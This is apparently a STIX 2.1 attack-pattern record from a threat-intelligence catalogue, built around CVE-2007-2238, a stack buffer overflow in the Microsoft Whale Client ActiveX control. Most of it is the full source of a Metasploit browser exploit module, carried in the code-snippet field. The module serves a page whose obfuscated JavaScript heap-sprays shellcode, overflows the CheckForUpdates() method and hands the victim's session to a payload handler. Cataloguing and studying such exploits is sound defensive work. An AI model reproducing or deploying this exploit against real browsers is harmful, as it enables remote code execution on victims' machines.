{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68a04233-22a0-410e-8050-14fb17805874",
    "created": "2024-08-14T16:40:06.442376Z",
    "modified": "2024-08-14T16:40:06.44238Z",
    "name": "Microsoft Whale Intelligent Application Gateway ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Microsoft Whale Intelligent Application Gateway Whale Client. When sending an overly long string to CheckForUpdates() method of WhlMgr.dll (3.1.502.64) an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mswhale_checkforupdates.rb",
            "external_id": "mswhale_checkforupdates.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2238"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/library/dd282918.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Whale Intelligent Application Gateway ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Microsoft Whale Intelligent Application\n        Gateway Whale Client. When sending an overly long string to CheckForUpdates()\n        method of WhlMgr.dll (3.1.502.64) an attacker may be able to execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-2238' ],\n          [ 'OSVDB', '53933'],\n          [ 'URL', 'http://technet.microsoft.com/en-us/library/dd282918.aspx' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]\n        ],\n      'DisclosureDate' => '2009-04-15',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # fluff..\n    fluff = rand_text_english(rand(20) + 1)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Set the return.\n    ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, \"or cl,[edx]\").encode_string * 2)\n\n    js = %Q|\n      try {\n        var evil_string = \"\";\n        var index;\n        var vulnerable = new ActiveXObject('ComponentManager.Installer.1');\n        var my_unescape = unescape;\n        var shellcode = '#{shellcode}';\n        #{js_heap_spray}\n        sprayHeap(my_unescape(shellcode), 0x0a0a0a0a, 0x40000);\n        for (index = 0; index < 15000; index++) {\n          evil_string = evil_string + my_unescape('#{ret}');\n        }\n        vulnerable.CheckForUpdates(evil_string,'#{fluff}');\n      } catch( e ) { window.location = 'about:blank' ; }\n    |\n\n    opts = {\n      'Strings' => true,\n      'Symbols' => {\n        'Variables' => [\n          'vulnerable',\n          'shellcode',\n          'my_unescape',\n          'index',\n          'evil_string',\n        ]\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.update_opts(js_heap_spray.opts)\n    js.obfuscate(memory_sensitive: true)\n    content = %Q|<html>\n<body>\n<script><!--\n#{js}\n//</script>\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-04-15",
    "x_mitre_platforms": [
        "win'"
    ]
}